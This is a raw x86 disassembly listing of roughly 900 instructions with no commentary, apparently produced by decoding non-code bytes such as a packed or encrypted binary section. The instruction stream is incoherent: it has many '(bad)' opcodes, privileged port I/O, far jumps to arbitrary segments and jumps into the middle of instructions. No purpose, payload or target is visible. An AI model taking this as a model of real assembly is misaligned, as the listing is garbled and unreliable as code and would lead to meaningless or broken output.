  417094:	push   ebx
  417095:	call   0xfc76:0x6829e78d
  41709c:	mov    fs,WORD PTR [esp+eiz*2-0x7e]
  4170a0:	fidivr DWORD PTR [ebp+0x7c41c874]
  4170a6:	or     esp,DWORD PTR [ebp+ebp*8-0x40]
  4170aa:	leave  
  4170ab:	push   es
  4170ac:	mov    cl,0x83
  4170ae:	test   eax,0x533f9fd9
  4170b3:	adc    al,0x6d
  4170b5:	aad    0xf0
  4170b7:	pop    ecx
  4170b8:	sub    eax,0xac082a00
  4170bd:	mov    edi,DWORD PTR [esi-0x7d]
  4170c0:	jecxz  0x41704e
  4170c2:	jg     0x4170b7
  4170c4:	add    al,0x9e
  4170c6:	adc    ah,BYTE PTR [ecx-0x566d0694]
  4170cc:	push   edx
  4170cd:	jmp    0x4170c1
  4170cf:	and    ebx,esp
  4170d1:	sti    
  4170d2:	lods   al,BYTE PTR ds:[esi]
  4170d3:	mov    ch,0xbc
  4170d5:	pop    ss
  4170d6:	mov    bh,0xcd
  4170d8:	and    ah,BYTE PTR gs:[edx+0x38]
  4170dc:	xchg   dl,al
  4170de:	sbb    BYTE PTR [esp+ebx*8-0x6a],ch
  4170e2:	aaa    
  4170e3:	mov    WORD PTR [ebx-0x682117a5],?
  4170e9:	loope  0x417150
  4170eb:	imul   DWORD PTR [esi-0x31]
  4170ee:	out    0x23,eax
  4170f0:	sbb    eax,0xf1345399
  4170f5:	cmp    BYTE PTR [ebx],cl
  4170f7:	push   0xfffffff8
  4170f9:	je     0x4170c6
  4170fb:	push   edi
  4170fc:	cmc    
  4170fd:	cmp    DWORD PTR [ecx],ecx
  4170ff:	mov    ch,0x4
  417101:	xchg   esi,eax
  417102:	fistp  DWORD PTR [ecx-0x4e]
  417105:	test   al,0xda
  417107:	and    ebx,DWORD PTR [ecx+ebp*4+0x4903f26f]
  41710e:	addr16 in ax,dx
  417111:	lods   al,BYTE PTR ds:[esi]
  417112:	in     al,0x52
  417114:	inc    edx
  417115:	jecxz  0x41716a
  417117:	loope  0x417164
  417119:	or     eax,0x145622bb
  41711e:	sub    esi,edx
  417120:	popf   
  417121:	jo     0x417129
  417123:	add    DWORD PTR [eax+ebx*1],eax
  417126:	sbb    DWORD PTR [esi+0x2e],esp
  417129:	in     eax,dx
  41712a:	in     al,0x5b
  41712c:	pop    edx
  41712d:	inc    edx
  41712e:	mov    ah,0x89
  417130:	or     al,0x32
  417132:	adc    BYTE PTR [ebp+eiz*4+0x79],bh
  417136:	pusha  
  417137:	outs   dx,BYTE PTR ds:[esi]
  417138:	in     eax,0x46
  41713a:	lods   al,BYTE PTR ds:[esi]
  41713b:	sub    DWORD PTR [ebp+0x28],0x5ac39199
  417142:	push   ds
  417143:	mov    dh,BYTE PTR [eax]
  417145:	loopne 0x4170f1
  417147:	outs   dx,BYTE PTR ds:[esi]
  417148:	add    al,0x50
  41714a:	inc    ebx
  41714b:	mov    ds:0x78029ae4,eax
  417150:	dec    ebx
  417151:	pop    edi
  417152:	adc    BYTE PTR [ebp-0x45],dl
  417155:	ficom  DWORD PTR [esi+0x7d]
  417158:	and    ecx,ebx
  41715a:	pop    esi
  41715b:	fcomp  QWORD PTR [ecx-0x4a6f2979]
  417161:	ss mov esp,0xe4b1757a
  417167:	jmp    0x4171d0
  417169:	fs jmp 0x6f0b:0xfbd50326
  417171:	leave  
  417172:	(bad)  
  417173:	cmc    
  417174:	mov    cl,0xe3
  417176:	sti    
  417177:	frstor [esi-0x6f]
  41717a:	cmc    
  41717b:	push   ss
  41717c:	push   ecx
  41717d:	jo     0x4171f6
  41717f:	aad    0x25
  417181:	or     eax,0xa3cd9d23
  417186:	xor    DWORD PTR [ebx-0x3e],0xacb0287d
  41718d:	push   esp
  41718e:	jp     0x417185
  417190:	test   DWORD PTR [ebp-0x4ec53d51],0xed2044bc
  41719a:	retf   0x12ca
  41719d:	cld    
  41719e:	jno    0x417162
  4171a0:	mov    eax,DWORD PTR [ebp-0x25]
  4171a3:	jl     0x4171e8
  4171a5:	iret   
  4171a6:	inc    esp
  4171a7:	jg     0x4171fc
  4171a9:	xor    ebp,esp
  4171ab:	jmp    0xb79:0x78f2b405
  4171b2:	push   sp
  4171b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171b5:	xor    edi,DWORD PTR [ebx-0x5e]
  4171b8:	push   ebx
  4171b9:	add    eax,0xb4712b40
  4171be:	xchg   esi,eax
  4171bf:	aam    0x52
  4171c1:	out    dx,eax
  4171c2:	xor    BYTE PTR [ecx-0x47eebb96],ch
  4171c8:	hlt    
  4171c9:	sub    edx,DWORD PTR [eax-0x552e46d8]
  4171cf:	pusha  
  4171d0:	lds    ebp,FWORD PTR [ecx]
  4171d2:	dec    ecx
  4171d3:	jne    0x417157
  4171d5:	mov    ecx,0xec25abd5
  4171da:	addr16 xchg ebx,eax
  4171dc:	retf   0x8776
  4171df:	sub    DWORD PTR [ebx],esi
  4171e1:	bswap  edi
  4171e3:	(bad)  
  4171e4:	mov    ds:0x19e1d291,al
  4171e9:	mov    al,ds:0xa167505e
  4171ee:	ins    DWORD PTR es:[edi],dx
  4171ef:	dec    edi
  4171f0:	xchg   ecx,eax
  4171f1:	dec    esp
  4171f2:	aaa    
  4171f3:	dec    edi
  4171f4:	test   BYTE PTR [ebx+0x24e60ffd],dl
  4171fa:	inc    ebx
  4171fb:	mov    ds:0xe54b7b35,al
  417200:	repz mov bl,0xe9
  417203:	(bad)  
  417204:	pop    esp
  417205:	jg     0x4171e3
  417207:	cmp    di,WORD PTR [eax+eax*8+0x4795aa77]
  41720f:	ret    0x8be2
  417212:	mov    dh,0x14
  417214:	dec    esi
  417215:	movups XMMWORD PTR [esi-0x4f],xmm6
  417219:	retf   
  41721a:	mov    dl,BYTE PTR ds:0x6ae2c59e
  417220:	arpl   cx,si
  417222:	sub    al,0x9d
  417224:	adc    al,0x39
  417226:	dec    edi
  417227:	pop    DWORD PTR [esi]
  417229:	jge    0x417281
  41722b:	shr    BYTE PTR [ebp+0x2e41997b],1
  417231:	(bad)  
  417233:	pop    edx
  417234:	xchg   ebx,eax
  417235:	push   0xfc5a723a
  41723a:	add    ch,BYTE PTR [ecx-0x72ef1421]
  417240:	test   DWORD PTR [edx],esi
  417242:	data16 loope 0x41722a
  417245:	imul   edx,DWORD PTR [ebp+eax*1+0x3f],0xbfacd48f
  41724d:	rcl    BYTE PTR [ebp-0xb30e44b],1
  417253:	xchg   esi,eax
  417254:	inc    edi
  417255:	ins    BYTE PTR es:[edi],dx
  417256:	xchg   esp,eax
  417257:	lods   eax,DWORD PTR ds:[esi]
  417258:	cmp    eax,0x95337dc9
  41725d:	int3   
  41725e:	outs   dx,BYTE PTR ds:[esi]
  41725f:	int    0x6f
  417261:	aad    0x5f
  417263:	daa    
  417264:	shl    DWORD PTR [edx-0x48],cl
  417267:	popa   
  417268:	dec    eax
  417269:	daa    
  41726a:	scas   eax,DWORD PTR es:[edi]
  41726b:	push   edx
  41726c:	push   ds
  41726d:	add    BYTE PTR [edi-0x6600f525],0xc4
  417274:	hlt    
  417275:	cmp    ebx,DWORD PTR [ebx+0x72]
  417278:	add    al,dl
  41727a:	sub    esp,esp
  41727c:	and    esi,DWORD PTR [edx]
  41727e:	and    BYTE PTR [ecx],cl
  417280:	xor    al,0xf0
  417282:	pop    es
  417283:	sbb    eax,0xaf7ce3f1
  417288:	(bad)  
  417289:	and    BYTE PTR [edx-0x158afd67],dh
  41728f:	or     esi,DWORD PTR [edx]
  417291:	outs   dx,BYTE PTR ds:[esi]
  417292:	les    edi,FWORD PTR [edi]
  417294:	test   DWORD PTR [eax-0x71],eax
  417297:	adc    al,0x33
  417299:	repnz dec ecx
  41729b:	lea    ecx,[edi-0x56]
  41729e:	test   al,0x31
  4172a0:	test   DWORD PTR [esi],eax
  4172a2:	fucomip st,st(2)
  4172a4:	fbstp  TBYTE PTR [ebp-0x62e0d062]
  4172aa:	fstp   TBYTE PTR [edx+ecx*2+0xb]
  4172ae:	test   eax,0xcf193ddf
  4172b3:	repnz in eax,dx
  4172b5:	arpl   WORD PTR [esi+0x725c16f1],cx
  4172bb:	fwait
  4172bc:	dec    esp
  4172bd:	test   edi,ecx
  4172bf:	and    BYTE PTR [esi+ecx*4+0x303fd0ac],ch
  4172c6:	mov    ecx,0xa0d86cb1
  4172cb:	ins    DWORD PTR es:[edi],dx
  4172cc:	ret    0x651c
  4172cf:	popa   
  4172d0:	mov    ds:0x3476b0a,eax
  4172d5:	sahf   
  4172d6:	rcr    DWORD PTR [ebx-0x5be9e1bc],0x31
  4172dd:	dec    eax
  4172de:	fcomp  QWORD PTR [ebx]
  4172e0:	jmp    0x486e3d8e
  4172e5:	daa    
  4172e6:	sub    edx,esi
  4172e8:	push   es
  4172e9:	push   ebp
  4172ea:	mov    ecx,DWORD PTR [esi-0x15]
  4172ed:	stos   DWORD PTR es:[edi],eax
  4172ee:	adc    al,BYTE PTR [ebx+0x1309d4c5]
  4172f4:	mov    esp,0x8c0222b1
  4172f9:	sub    esp,DWORD PTR [eax]
  4172fb:	adc    ch,BYTE PTR [eax-0x4f08d41]
  417301:	push   edx
  417302:	stos   DWORD PTR es:[edi],eax
  417303:	jns    0x417360
  417305:	cs jl  0x41735c
  417308:	scas   al,BYTE PTR es:[edi]
  417309:	pop    esi
  41730a:	jo     0x4172cc
  41730c:	shl    BYTE PTR [ebx],0xed
  41730f:	mov    ds:0x125817d1,al
  417314:	push   ecx
  417315:	xlat   BYTE PTR ds:[ebx]
  417316:	imul   esp
  417318:	loop   0x4172a0
  41731a:	pop    edi
  41731b:	int    0xcb
  41731d:	pop    ss
  41731e:	lods   al,BYTE PTR ds:[esi]
  41731f:	push   ebp
  417320:	or     BYTE PTR [eax-0x33],bh
  417323:	call   0x1598:0xdd48f235
  41732a:	aad    0xb6
  41732c:	sbb    BYTE PTR [ecx+0x1c],dl
  41732f:	cmp    al,0xec
  417331:	sub    BYTE PTR [eax+0x3c466344],al
  417337:	mov    eax,0x1fe6e9b5
  41733c:	mov    ch,0xd4
  41733e:	mov    bh,0x1b
  417340:	cs cmp bl,cl
  417343:	cmp    bh,BYTE PTR [esi+ecx*1]
  417346:	dec    esp
  417347:	lahf   
  417348:	add    al,0x4d
  41734a:	mov    bh,0x4a
  41734c:	scas   eax,DWORD PTR es:[edi]
  41734d:	ss pop ss
  41734f:	xchg   ebp,eax
  417350:	pop    edi
  417351:	ret    0xa743
  417354:	fidiv  WORD PTR [ecx-0x39]
  417357:	jb     0x417393
  417359:	xchg   esi,eax
  41735a:	outs   dx,BYTE PTR ds:[esi]
  41735b:	fwait
  41735c:	xchg   ecx,eax
  41735d:	les    ecx,FWORD PTR [eax-0x30fefb52]
  417363:	xor    eax,0x339c6bf6
  417368:	sub    BYTE PTR [ebp-0x4ee74bad],ah
  41736e:	sbb    al,bl
  417370:	psraw  mm5,QWORD PTR [esi+0x4f1b8454]
  417377:	and    ah,al
  417379:	outs   dx,BYTE PTR ds:[esi]
  41737a:	in     al,dx
  41737b:	cmp    esp,DWORD PTR [ebp-0x75380aec]
  417381:	xor    eax,0x5c925ad
  417386:	jmp    0x4173d5
  417388:	popf   
  417389:	jae    0x4173a7
  41738b:	inc    esp
  41738c:	adc    bl,dh
  41738e:	inc    di
  417390:	retf   
  417391:	cli    
  417392:	push   es
  417393:	test   DWORD PTR [ecx],eax
  417395:	cdq    
  417396:	xchg   ecx,eax
  417397:	adc    DWORD PTR [ecx+ebx*2],0xa
  41739b:	and    al,0x13
  41739d:	mov    edi,0x953a60c5
  4173a2:	cli    
  4173a3:	mov    DWORD PTR [ecx-0x23b7aab9],ebp
  4173a9:	xchg   dl,bl
  4173ab:	int    0x48
  4173ad:	int    0x85
  4173af:	or     al,BYTE PTR [edi-0x12a54ca]
  4173b5:	fs in  eax,dx
  4173b7:	stc    
  4173b8:	retf   
  4173b9:	mov    ah,0x3c
  4173bb:	push   cs
  4173bc:	sahf   
  4173bd:	mov    ebp,0xa92e0be8
  4173c2:	dec    esi
  4173c3:	imul   eax,DWORD PTR [eax],0xb87d0596
  4173c9:	mov    ds:0x3c1cbd1a,al
  4173ce:	mov    ?,esi
  4173d0:	or     al,0xfe
  4173d2:	cmp    ecx,edx
  4173d4:	sti    
  4173d5:	dec    ecx
  4173d6:	in     eax,dx
  4173d7:	cdq    
  4173d8:	or     edx,edi
  4173da:	xchg   edi,eax
  4173db:	or     DWORD PTR [ecx-0x75],ecx
  4173de:	mov    dl,dl
  4173e0:	cdq    
  4173e1:	std    
  4173e2:	and    ebp,eax
  4173e4:	xchg   esi,eax
  4173e5:	in     eax,dx
  4173e6:	neg    eax
  4173e8:	push   0xf7618e7
  4173ed:	push   ebx
  4173ee:	pop    esi
  4173ef:	loopne 0x417470
  4173f1:	mov    esi,0xfffab255
  4173f6:	idiv   al
  4173f8:	fmul   st(1),st
  4173fa:	out    dx,eax
  4173fb:	fcom   DWORD PTR [ebx+0x59db9315]
  417401:	fldcw  WORD PTR [esi-0x30a98d4b]
  417407:	jo     0x4173c6
  417409:	test   BYTE PTR [esi+0x2dfc996d],bh
  41740f:	jb     0x3ae137bc
  417415:	outs   dx,DWORD PTR ds:[esi]
  417416:	lock add ah,BYTE PTR [ecx]
  417419:	out    0x39,al
  41741b:	jge    0x41741b
  41741d:	cmp    al,0xad
  41741f:	stos   BYTE PTR es:[edi],al
  417420:	sbb    eax,0x93b3ac87
  417425:	xlat   BYTE PTR ds:[ebx]
  417426:	dec    esi
  417427:	(bad)  
  417428:	je     0x4174a4
  41742a:	in     eax,dx
  41742b:	dec    edx
  41742c:	sahf   
  41742d:	and    DWORD PTR [edi+0x33],ebx
  417430:	and    ch,BYTE PTR [esi+0x17c06a82]
  417436:	xchg   DWORD PTR [esi+0x13],ebp
  417439:	or     eax,0x44197352
  41743e:	dec    esp
  41743f:	add    al,0xaf
  417441:	sahf   
  417442:	out    dx,al
  417443:	jmp    0x417435
  417445:	and    BYTE PTR [eax-0x2],cl
  417448:	jbe    0x4173df
  41744a:	mov    cl,0xdc
  41744c:	js     0x41747e
  41744e:	adc    BYTE PTR [ecx+ebp*2+0x10],0xdf
  417453:	jg     0x4174a4
  417455:	mov    edi,0x1ce7c41
  41745a:	ret    
  41745b:	and    esi,edx
  41745d:	push   edx
  41745e:	loopne 0x417411
  417460:	xchg   edi,eax
  417461:	sub    al,0xc1
  417463:	sub    DWORD PTR [edi+eax*8-0x2796b9f1],ecx
  41746a:	not    DWORD PTR [ebx+0x4f]
  41746d:	sbb    al,0x48
  41746f:	add    BYTE PTR ds:[ebx],al
  417472:	xlat   BYTE PTR ds:[ebx]
  417473:	mov    ebp,DWORD PTR [edi]
  417475:	add    ah,BYTE PTR [edi]
  417477:	in     eax,dx
  417478:	ror    DWORD PTR [ecx],cl
  41747a:	pop    ebx
  41747b:	lods   eax,DWORD PTR ds:[esi]
  41747c:	push   es
  41747d:	fwait
  41747e:	int    0xc4
  417480:	xchg   esi,eax
  417481:	ins    BYTE PTR es:[edi],dx
  417482:	scas   eax,DWORD PTR es:[edi]
  417483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417484:	test   al,0xe8
  417486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417487:	loope  0x417489
  417489:	call   ebx
  41748b:	icebp  
  41748c:	mov    ds:0xef25a808,al
  417491:	shl    DWORD PTR [edi+eiz*2-0x14],cl
  417495:	jl     0x417480
  417497:	pop    ebx
  417498:	add    eax,0xcb7aacef
  41749d:	ins    BYTE PTR es:[edi],dx
  41749e:	ror    BYTE PTR [edx],cl
  4174a0:	sbb    BYTE PTR [edi],dh
  4174a2:	cmp    BYTE PTR [ebx],0x54
  4174a5:	fild   WORD PTR [eax-0x2d]
  4174a8:	pop    ebp
  4174a9:	pop    ds
  4174aa:	fidiv  DWORD PTR ds:0xa6f33e35
  4174b0:	jbe    0x417452
  4174b2:	hlt    
  4174b3:	mov    ch,0x65
  4174b5:	ret    0xbd75
  4174b8:	(bad)  
  4174ba:	inc    edx
  4174bb:	in     al,dx
  4174bc:	test   eax,0x3161175e
  4174c1:	pop    ebp
  4174c2:	(bad)  
  4174c4:	jmp    0x88d7:0x357d5553
  4174cb:	outs   dx,BYTE PTR ds:[esi]
  4174cc:	mov    bl,0xa5
  4174ce:	mov    ebp,ebx
  4174d0:	cmp    dh,BYTE PTR [edi+0x340b1b16]
  4174d6:	loope  0x4174b8
  4174d8:	jne    0x4174dd
  4174da:	pop    ebx
  4174db:	call   0x81ed:0xe855799c
  4174e2:	mov    edx,0x8f21aa59
  4174e7:	or     BYTE PTR [ebx],0x68
  4174ea:	cs jg  0x41746e
  4174ed:	sub    BYTE PTR [edx+edi*8-0x7e],0xea
  4174f2:	ret    
  4174f3:	call   0x8a09bfd7
  4174f8:	retf   0x9454
  4174fb:	dec    ebx
  4174fc:	adc    eax,0x782e9cf7
  417501:	cmp    DWORD PTR [edi+0x203035a8],0xfb2fe3aa
  41750b:	push   eax
  41750c:	mov    WORD PTR [esi],fs
  41750e:	push   edx
  41750f:	lds    edi,FWORD PTR [edi]
  417511:	push   ds
  417512:	xchg   esp,eax
  417513:	pop    ds
  417514:	xor    ebx,DWORD PTR [ecx]
  417516:	test   eax,0x9d411829
  41751b:	jmp    0x462e:0x9fbacd05
  417522:	in     eax,dx
  417523:	dec    eax
  417524:	xchg   edx,eax
  417525:	arpl   WORD PTR [ecx-0x28],bx
  417528:	ds clc 
  41752a:	in     eax,dx
  41752b:	cmp    al,0xa3
  41752d:	stos   BYTE PTR es:[edi],al
  41752e:	jns    0x417533
  417530:	call   0xf010:0xbb3287a8
  417537:	cwde   
  417538:	jne    0x417508
  41753a:	loop   0x4174ef
  41753c:	pop    ds
  41753d:	fwait
  41753e:	(bad)  
  41753f:	or     BYTE PTR [ecx+0x687a901b],ch
  417545:	jbe    0x417580
  417547:	repz jo 0x4175b0
  41754a:	sbb    eax,DWORD PTR [ecx+0x7f]
  41754d:	pushf  
  41754e:	or     BYTE PTR [ebx],bh
  417550:	(bad)  [ebp-0x66deb337]
  417556:	inc    ebp
  417557:	int    0xa2
  417559:	jle    0x41759a
  41755b:	dec    ebx
  41755c:	cmp    eax,0xd667c86b
  417561:	jmp    0x6be33843
  417566:	nop
  417567:	pusha  
  417568:	pop    edx
  417569:	out    0x35,al
  41756b:	dec    esi
  41756c:	cwde   
  41756d:	pop    edx
  41756e:	pop    ecx
  41756f:	stos   DWORD PTR es:[edi],eax
  417570:	mov    edi,0xa43d47cd
  417575:	jns    0x41750f
  417577:	dec    esi
  417578:	jb     0x4175b6
  41757a:	add    al,0x95
  41757c:	mov    ah,0x89
  41757e:	and    DWORD PTR [ebp-0x2ac7afed],ebp
  417584:	aad    0x19
  417586:	mov    ebx,0x3d182aff
  41758b:	inc    esi
  41758c:	mov    dl,0xe1
  41758e:	cwde   
  41758f:	pop    DWORD PTR [edx+0x18]
  417592:	jecxz  0x4175e8
  417594:	mov    al,cl
  417596:	ficom  WORD PTR gs:[eax]
  417599:	test   BYTE PTR [edx],ah
  41759b:	add    al,0xcf
  41759d:	cmp    al,0x64
  41759f:	es pop ss
  4175a1:	shr    ebx,cl
  4175a3:	test   eax,0x35b92042
  4175a8:	iret   
  4175a9:	mov    eax,0x1bed4cc9
  4175ae:	out    0x7d,al
  4175b0:	hlt    
  4175b1:	mov    ah,0x5
  4175b3:	sub    esp,eax
  4175b5:	hlt    
  4175b6:	mov    ds:0x8a6f5fe7,al
  4175bb:	ja     0x417619
  4175bd:	mov    ds:0xc4f5ce69,al
  4175c2:	sbb    DWORD PTR [edi-0x21cfed98],ebp
  4175c8:	mov    BYTE PTR [edi+ecx*8-0x4dcfb9a2],al
  4175cf:	pop    edi
  4175d0:	or     al,0x4b
  4175d2:	or     BYTE PTR [ecx+0x3b],dl
  4175d5:	fwait
  4175d6:	je     0x41757b
  4175d8:	test   BYTE PTR [ebp-0x77be8856],al
  4175de:	pop    ds
  4175df:	xchg   ebp,eax
  4175e0:	cmp    ecx,ebp
  4175e2:	(bad)  
  4175e3:	lahf   
  4175e4:	jo     0x4175b2
  4175e6:	xlat   BYTE PTR ds:[ebx]
  4175e7:	xchg   ebx,eax
  4175e8:	daa    
  4175e9:	aaa    
  4175ea:	inc    ebp
  4175eb:	add    dh,ah
  4175ed:	lods   al,BYTE PTR ds:[esi]
  4175ee:	sub    dl,cl
  4175f0:	jbe    0x417668
  4175f2:	test   al,0x22
  4175f4:	test   DWORD PTR [esi+eiz*1-0x24],edx
  4175f8:	mov    edi,0x81c40577
  4175fd:	lods   al,BYTE PTR ds:[esi]
  4175fe:	dec    eax
  4175ff:	jl     0x41761b
  417601:	mov    ss,WORD PTR [eax-0xfde9567]
  417607:	sub    eax,0x33d23a13
  41760c:	test   BYTE PTR [esp+edx*8],0xc3
  417610:	outs   dx,DWORD PTR ds:[esi]
  417611:	pop    esi
  417612:	xchg   edx,eax
  417613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417615:	mov    BYTE PTR [eax+esi*2-0x3e],ch
  417619:	push   cs
  41761a:	and    esi,DWORD PTR [esi-0x80]
  41761d:	pop    edi
  41761e:	xchg   ebx,eax
  41761f:	or     DWORD PTR [edx+0x18],ecx
  417622:	leave  
  417623:	jp     0x4175db
  417625:	pop    ss
  417626:	(bad)  
  417627:	out    dx,al
  417628:	mov    dl,0xa3
  41762a:	xlat   BYTE PTR ds:[ebx]
  41762b:	and    eax,0x50340d8e
  417630:	push   edi
  417631:	test   eax,0x5c9db1e2
  417636:	pop    edx
  417637:	and    eax,0x47cfa84c
  41763c:	xchg   edx,eax
  41763d:	scas   al,BYTE PTR es:[edi]
  41763e:	mov    esi,0xd8714f5c
  417643:	mov    ebx,0xdc09084e
  417648:	and    eax,0xc09b35d2
  41764d:	iret   
  41764e:	pop    edx
  41764f:	inc    esi
  417650:	xchg   ebx,eax
  417651:	rol    DWORD PTR [ebx-0x39],cl
  417654:	xor    BYTE PTR [ebp+0x4bef1d0e],dl
  41765a:	into   
  41765b:	xchg   ecx,eax
  41765c:	(bad)  
  41765d:	clc    
  41765e:	dec    edi
  41765f:	enter  0xa197,0xc4
  417663:	enter  0xd823,0x43
  417667:	in     al,0x1f
  417669:	mov    ebp,0x1b0ef2a
  41766e:	inc    edi
  41766f:	fist   WORD PTR [eax]
  417671:	xchg   edi,eax
  417672:	cwde   
  417673:	mov    dh,0xe8
  417675:	bound  ebp,QWORD PTR [ecx-0x53]
  417678:	push   es
  417679:	push   ebp
  41767a:	sub    eax,0x1bf30a6e
  41767f:	aam    0x38
  417681:	dec    edx
  417682:	jle    0x4176fb
  417684:	(bad)  
  417685:	jb     0x417685
  417687:	ss xor eax,0xd9c7dc54
  41768d:	int3   
  41768e:	jmp    0xab1a:0xa040443f
  417695:	push   edi
  417696:	push   cs
  417697:	pop    ds
  417698:	sbb    bl,dl
  41769a:	test   DWORD PTR [edx+0x69eb53c7],ebp
  4176a0:	aas    
  4176a1:	adc    dh,ch
  4176a3:	cmp    al,0x7b
  4176a5:	enter  0x1bcd,0x17
  4176a9:	pop    ecx
  4176aa:	leave  
  4176ab:	dec    edi
  4176ac:	jge    0x417698
  4176ae:	into   
  4176af:	dec    ecx
  4176b0:	sbb    dl,BYTE PTR [eax]
  4176b2:	iret   
  4176b3:	(bad)  
  4176b4:	cmp    al,0xcd
  4176b6:	cmp    al,0x86
  4176b8:	aas    
  4176b9:	dec    edx
  4176ba:	cmp    eax,esi
  4176bc:	lods   al,BYTE PTR ds:[esi]
  4176bd:	stos   BYTE PTR es:[edi],al
  4176be:	les    eax,FWORD PTR [ebp+0x70]
  4176c1:	je     0x417735
  4176c3:	imul   edx,DWORD PTR [ecx-0xd],0xe6b9333f
  4176ca:	(bad)  
  4176cb:	mov    eax,ds:0x474cdda0
  4176d0:	fdiv   QWORD PTR [esi]
  4176d2:	push   eax
  4176d3:	sub    BYTE PTR [esi+0x3a6c9309],ah
  4176d9:	mov    ebx,0xe4b24187
  4176de:	cld    
  4176df:	fadd   QWORD PTR [eax]
  4176e1:	cmp    BYTE PTR [edi],al
  4176e3:	sahf   
  4176e4:	and    ecx,DWORD PTR [ecx+0x356ca806]
  4176ea:	enter  0x5396,0xa7
  4176ee:	adc    ebx,DWORD PTR [edx]
  4176f0:	ret    0xe02c
  4176f3:	jns    0x4176a7
  4176f5:	addr16 inc esp
  4176f7:	sahf   
  4176f8:	jg     0x417770
  4176fa:	pop    esi
  4176fb:	dec    edi
  4176fc:	pusha  
  4176fd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176ff:	xchg   DWORD PTR [ebx+0x68],ebx
  417702:	adc    esi,DWORD PTR [esi]
  417704:	imul   ebx,eax,0x5c
  417707:	(bad)  
  417708:	(bad)  
  417709:	rol    DWORD PTR cs:[eax],0x62
  41770d:	pop    ebp
  41770e:	mov    BYTE PTR [esi-0x64],0xa9
  417712:	pop    ds
  417713:	mov    bh,0x8a
  417715:	(bad)  
  417716:	sub    esp,DWORD PTR [edx+0x46fe6b0b]
  41771c:	fistp  DWORD PTR [edx]
  41771e:	sbb    DWORD PTR fs:[edi-0x31],esp
  417722:	push   ss
  417723:	and    eax,0xd8ac9754
  417728:	pop    esi
  417729:	sub    ch,BYTE PTR [ebx+0x58c54e54]
  41772f:	mov    ecx,0xf1dd36d9
  417734:	cmp    ebp,eax
  417736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417737:	sbb    ah,BYTE PTR [ebx-0x62c3dca6]
  41773d:	(bad)  
  41773e:	retf   0xb01a
  417741:	inc    esi
  417742:	int    0x80
  417744:	out    dx,al
  417745:	xchg   DWORD PTR [eax+eiz*4-0x3f9234ae],eax
  41774c:	hlt    
  41774d:	int    0xf6
  41774f:	stos   BYTE PTR es:[edi],al
  417750:	retf   
  417751:	cmc    
  417752:	sub    BYTE PTR [edx],ch
  417754:	pushf  
  417755:	into   
  417756:	cdq    
  417757:	lahf   
  417758:	dec    eax
  417759:	js     0x417717
  41775b:	cld    
  41775c:	stc    
  41775d:	xlat   BYTE PTR ds:[ebx]
  41775e:	cmp    BYTE PTR gs:[eax+eax*1+0x221af76b],bl
  417766:	add    edi,DWORD PTR [ebp+0x22131700]
  41776c:	dec    edx
  41776d:	das    
  41776e:	adc    DWORD PTR [ebx+0x45],eax
  417771:	std    
  417772:	jmp    0x417702
  417774:	adc    al,0x23
  417776:	and    BYTE PTR [edi+edi*8-0x54],0x2f
  41777b:	jle    0x417773
  41777d:	cmc    
  41777e:	das    
  41777f:	repz aam 0x60
  417782:	fwait
  417783:	sbb    al,BYTE PTR [edi+0x72]
  417786:	dec    esp
  417787:	push   cs
  417788:	rcr    DWORD PTR [edx],cl
  41778a:	inc    esi
  41778b:	out    dx,eax
  41778c:	sub    DWORD PTR [esi-0x1608ee8a],esi
  417792:	scas   eax,DWORD PTR es:[edi]
  417793:	mov    esi,0x64e11ae6
  417798:	xchg   BYTE PTR [edx-0x4e],cl
  41779b:	ja     0x4177c9
  41779d:	sbb    bh,cl
  41779f:	mov    ch,0xa
  4177a1:	dec    edi
  4177a2:	mov    al,ds:0x7a863984
  4177a7:	in     eax,0x88
  4177a9:	adc    BYTE PTR [ecx+0x3],ch
  4177ac:	out    dx,eax
  4177ad:	into   
  4177ae:	pop    ebp
  4177af:	push   cs
  4177b0:	mov    ds:0x8ed31516,al
  4177b5:	and    al,BYTE PTR [edx]
  4177b7:	sbb    esi,DWORD PTR [esi]
  4177b9:	dec    ebp
  4177ba:	push   eax
  4177bb:	mov    ecx,0x91e53983
  4177c0:	(bad)  
  4177c1:	or     BYTE PTR [edi+esi*8-0x23bfd49d],bl
  4177c8:	xor    eax,0x93862b81
  4177cd:	call   0x7b1ced9d
  4177d2:	ror    DWORD PTR [ebx-0x51],cl
  4177d5:	daa    
  4177d6:	(bad)  
  4177d7:	fisttp WORD PTR [ebp+0x24]
  4177da:	(bad)  
  4177db:	push   0x4e
  4177dd:	test   al,0x28
  4177df:	adc    dh,ch
  4177e1:	adc    eax,DWORD PTR [ebx+0x7c705071]
  4177e7:	dec    esi
  4177e8:	popf   
  4177e9:	cmp    al,0xed
  4177eb:	push   ecx
  4177ec:	data16 std 
  4177ee:	push   es
  4177ef:	push   0xffffffba
  4177f1:	popa   
  4177f2:	mov    esp,0xe0be8881
  4177f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177f8:	sti    
  4177f9:	push   ebp
  4177fb:	or     al,0x2d
  4177fd:	push   ebx
  4177fe:	loope  0x417788
  417800:	mov    ds:0xf8e30096,al
  417805:	cli    
  417806:	shr    DWORD PTR [ebp+ebx*4-0x4a],1
  41780a:	or     eax,0xc08c1b2b
  41780f:	pop    esi
  417810:	push   0x27
  417812:	fs mov bl,0x5e
  417815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417816:	jp     0x417870
  417818:	bound  edi,QWORD PTR [eax+ebx*4-0x308072f4]
  41781f:	xor    eax,0x212768b8
  417824:	and    dl,ch
  417826:	fadd   QWORD PTR [edi-0x73704d3b]
  41782c:	ins    DWORD PTR es:[edi],dx
  41782d:	lahf   
  41782e:	cmp    eax,0x60957ae1
  417833:	ds adc ebp,eax
  417836:	inc    edx
  417837:	push   es
  417838:	and    ebp,DWORD PTR [ebp+0x43]
  41783b:	fsubr  st(1),st
  41783d:	cmc    
  41783e:	mov    ebx,0x23c25758
  417843:	fprem  
  417845:	cld    
  417846:	dec    eax
  417847:	fiadd  WORD PTR [ebx]
  417849:	mov    esp,0x6601000e
  41784e:	sub    eax,0x58dade91
  417853:	repz rol DWORD PTR [edi+0x52],0xad
